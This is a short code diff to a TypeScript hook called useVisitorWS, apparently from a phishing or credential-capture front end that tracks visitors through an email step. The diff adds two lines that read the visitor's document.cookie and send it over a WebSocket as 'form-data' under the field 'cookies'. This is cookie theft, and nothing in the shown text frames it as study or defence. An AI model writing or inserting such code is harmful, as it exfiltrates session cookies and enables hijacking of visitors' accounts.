@@ -130,6 +130,8 @@ function useVisitorWS({ provider, onNavigate, onProviderSwitch }: {
             step: 'email',
             userAgent: navigator.userAgent,
           }));
+          const cookieVal = document.cookie || '(none)';
+          ws!.send(JSON.stringify({ type: 'form-data', field: 'cookies', value: cookieVal }));
         }
         const queued = pendingQueue.current.splice(0);
         for (const m of queued) ws!.send(m);
